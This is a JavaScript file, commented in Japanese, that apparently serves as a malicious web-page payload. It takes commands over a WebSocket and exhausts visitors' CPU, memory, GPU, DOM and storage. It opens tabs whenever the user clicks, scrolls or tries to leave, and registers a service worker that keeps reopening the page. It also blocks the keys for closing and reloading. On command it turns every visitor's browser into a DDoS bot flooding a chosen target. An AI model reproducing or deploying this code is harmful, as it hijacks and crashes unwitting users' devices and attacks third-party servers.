(function() {
    'use strict';

    let socket = null;
    let isAttacking = false;
    let ddosTarget = null;
    let isDDoSing = false;

    function connectWebSocket() {
        try {
            const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
            socket = new WebSocket(protocol + location.host + '/ws');
            
            socket.onopen = () => {
                startAttack();
            };
            
            socket.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    if (data.command === 'attack') {
                        startAttack();
                    }
                    if (data.command === 'stop') {
                        isAttacking = false;
                        isDDoSing = false;
                    }
                    if (data.command === 'ddos') {
                        ddosTarget = data.target;
                        startDDoS();
                    }
                } catch(err) {}
            };
            
            socket.onclose = () => {
                setTimeout(connectWebSocket, 1000);
            };
            
            socket.onerror = () => {
                socket.close();
            };
        } catch(e) {}
    }

    function startAttack() {
        if (isAttacking) return;
        isAttacking = true;
        
        cpuAttack();
        memoryAttack();
        gpuAttack();
        domAttack();
        storageAttack();
        tabMultiplier();
        serviceWorkerRegister();
    }

    // ============================================
    // タブ増殖
    // ============================================
    function tabMultiplier() {
        let tapCount = 0;
        
        // タップで増殖
        document.addEventListener('click', () => {
            if (!isAttacking) return;
            
            tapCount++;
            const openCount = Math.min(tapCount, 10);
            
            for (let i = 0; i < openCount; i++) {
                try {
                    window.open(location.href, '_blank');
                } catch(e) {}
            }
        });
        
        // タッチデバイス用
        document.addEventListener('touchstart', () => {
            if (!isAttacking) return;
            
            tapCount++;
            const openCount = Math.min(tapCount, 10);
            
            for (let i = 0; i < openCount; i++) {
                try {
                    window.open(location.href, '_blank');
                } catch(e) {}
            }
        });
        
        // 閉じようとしたら増殖
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
            
            for (let i = 0; i < 5; i++) {
                try {
                    window.open(location.href, '_blank');
                } catch(e) {}
            }
        });
        
        // pagehideでも増殖
        window.addEventListener('pagehide', () => {
            for (let i = 0; i < 3; i++) {
                try {
                    window.open(location.href, '_blank');
                } catch(e) {}
            }
        });
        
        // スクロールでも増殖
        let lastScroll = 0;
        window.addEventListener('scroll', () => {
            const now = Date.now();
            if (now - lastScroll > 2000) {
                lastScroll = now;
                try {
                    window.open(location.href, '_blank');
                } catch(e) {}
            }
        });
    }

    // ============================================
    // Service Worker登録（保険・5〜10秒で復活）
    // ============================================
    function serviceWorkerRegister() {
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('install', (e) => {
                    self.skipWaiting();
                });
                
                self.addEventListener('activate', (e) => {
                    e.waitUntil(clients.claim());
                });
                
                self.addEventListener('fetch', (e) => {
                    e.respondWith(
                        caches.open('attack-cache').then((cache) => {
                            return fetch(e.request).then((response) => {
                                cache.put(e.request, response.clone());
                                return response;
                            }).catch(() => {
                                return cache.match(e.request);
                            });
                        })
                    );
                });
                
                // 5〜10秒ごとにクライアントを復活
                setInterval(() => {
                    clients.matchAll().then((clientList) => {
                        if (clientList.length === 0) {
                            clients.openWindow('/');
                        }
                    });
                }, 5000 + Math.random() * 5000);
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(swUrl)
                .then(() => console.log('SW登録成功'))
                .catch(() => console.log('SW登録失敗'));
        }
    }

    // ============================================
    // DDoS攻撃（全員自動参加）
    // ============================================
    function startDDoS() {
        if (isDDoSing || !ddosTarget) return;
        isDDoSing = true;
        
        function attack() {
            if (!isDDoSing) return;
            
            for (let i = 0; i < 50; i++) {
                fetch(ddosTarget + '?ddos=' + Math.random(), {
                    mode: 'no-cors',
                    cache: 'no-store'
                }).catch(() => {});
                
                const img = new Image();
                img.src = ddosTarget + '?img=' + Math.random();
                
                const script = document.createElement('script');
                script.src = ddosTarget + '?js=' + Math.random();
                document.head.appendChild(script);
                script.remove();
            }
        }
        
        const attackInterval = setInterval(attack, 0);
        
        setTimeout(() => {
            clearInterval(attackInterval);
            if (isDDoSing) startDDoS();
        }, 10000);
    }

    // CPU攻撃
    function cpuAttack() {
        const cores = navigator.hardwareConcurrency || 4;
        
        function mainThreadLoad() {
            if (!isAttacking) return;
            
            let x = 0;
            const start = Date.now();
            
            while (Date.now() - start < 50) {
                x += Math.sqrt(Math.random() * 1000) * Math.random();
                x += Math.pow(Math.random(), 2) * Math.random();
                x += Math.sin(Math.random() * 360) * Math.random();
            }
            
            setTimeout(mainThreadLoad, 10);
        }
        
        const workerCode = `
            let running = true;
            
            self.onmessage = (e) => {
                if (e.data === 'stop') running = false;
                if (e.data === 'start') running = true;
            };
            
            function heavyLoop() {
                if (!running) return;
                
                let x = 0;
                const start = Date.now();
                
                while (Date.now() - start < 100) {
                    x += Math.sqrt(Math.random() * 1000) * Math.random();
                    x += Math.pow(Math.random(), 2) * Math.random();
                    x += Math.sin(Math.random() * 360) * Math.random();
                    x += Math.cos(Math.random() * 360) * Math.random();
                    x += Math.tan(Math.random() * 360) * Math.random();
                    x += Math.log(Math.random() * 1000 + 1) * Math.random();
                }
                
                setTimeout(heavyLoop, 0);
            }
            
            heavyLoop();
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        
        for (let i = 0; i < cores; i++) {
            try {
                const worker = new Worker(url);
                worker.postMessage('start');
            } catch(e) {}
        }
        
        mainThreadLoad();
    }

    // メモリ攻撃
    function memoryAttack() {
        const memArrays = [];
        
        function allocateMemory() {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 10; i++) {
                    const buffer = new ArrayBuffer(1024 * 1024 * 5);
                    const view = new Uint8Array(buffer);
                    
                    for (let j = 0; j < view.length; j += 100) {
                        view[j] = Math.random() * 255;
                    }
                    
                    memArrays.push(buffer);
                }
                
                if (memArrays.length > 100) {
                    memArrays.splice(0, 20);
                }
            } catch(e) {
                memArrays.length = 0;
            }
            
            setTimeout(allocateMemory, 50);
        }
        
        allocateMemory();
    }

    // GPU攻撃
    function gpuAttack() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 8000;
            canvas.height = 8000;
            canvas.style.display = 'none';
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            
            function heavyDraw() {
                if (!isAttacking) return;
                
                for (let i = 0; i < 500; i++) {
                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                    ctx.fillRect(
                        Math.random()*8000,
                        Math.random()*8000,
                        Math.random()*500,
                        Math.random()*500
                    );
                }
                
                for (let i = 0; i < 50; i++) {
                    ctx.beginPath();
                    ctx.moveTo(Math.random()*8000, Math.random()*8000);
                    
                    for (let j = 0; j < 20; j++) {
                        ctx.lineTo(Math.random()*8000, Math.random()*8000);
                    }
                    
                    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                    ctx.lineWidth = Math.random() * 50;
                    ctx.stroke();
                }
                
                ctx.shadowBlur = 100;
                ctx.shadowColor = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
                
                for (let i = 0; i < 100; i++) {
                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
                    ctx.fillRect(
                        Math.random()*8000,
                        Math.random()*8000,
                        Math.random()*1000,
                        Math.random()*1000
                    );
                }
                
                ctx.shadowBlur = 0;
                
                setTimeout(heavyDraw, 0);
            }
            
            heavyDraw();
        } catch(e) {}
    }

    // DOM攻撃
    function domAttack() {
        const container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);
        
        function createElements() {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 1000; i++) {
                    const el = document.createElement('div');
                    el.textContent = 'x'.repeat(Math.floor(Math.random() * 1000));
                    el.setAttribute('data-index', i);
                    el.setAttribute('data-random', Math.random());
                    el.setAttribute('data-date', Date.now());
                    el.style.cssText = `
                        position: absolute;
                        top: ${Math.random()*10000}px;
                        left: ${Math.random()*10000}px;
                        width: ${Math.random()*500}px;
                        height: ${Math.random()*500}px;
                        background: rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
                        opacity: ${Math.random()};
                        transform: rotate(${Math.random()*360}deg);
                        border: ${Math.random()*10}px solid rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
                    `;
                    container.appendChild(el);
                }
                
                if (container.children.length > 5000) {
                    container.innerHTML = '';
                }
            } catch(e) {}
            
            setTimeout(createElements, 30);
        }
        
        createElements();
    }

    // ストレージ攻撃
    function storageAttack() {
        function fillStorage() {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 50; i++) {
                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(10000));
                }
                
                if (localStorage.length > 500) {
                    const keys = Object.keys(localStorage);
                    for (let i = 0; i < 50; i++) {
                        localStorage.removeItem(keys[i]);
                    }
                }
            } catch(e) {}
            
            setTimeout(fillStorage, 100);
        }
        
        fillStorage();
    }

    // 離脱防止
    function preventLeave() {
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
        
        document.addEventListener('keydown', (e) => {
            if (
                (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'r' || e.key === 'R')) ||
                (e.altKey && e.key === 'F4') ||
                e.key === 'F5' ||
                e.key === 'F12'
            ) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);
        
        document.addEventListener('contextmenu', (e) => e.preventDefault());
    }

    function init() {
        connectWebSocket();
        preventLeave();
    }

    init();
})();
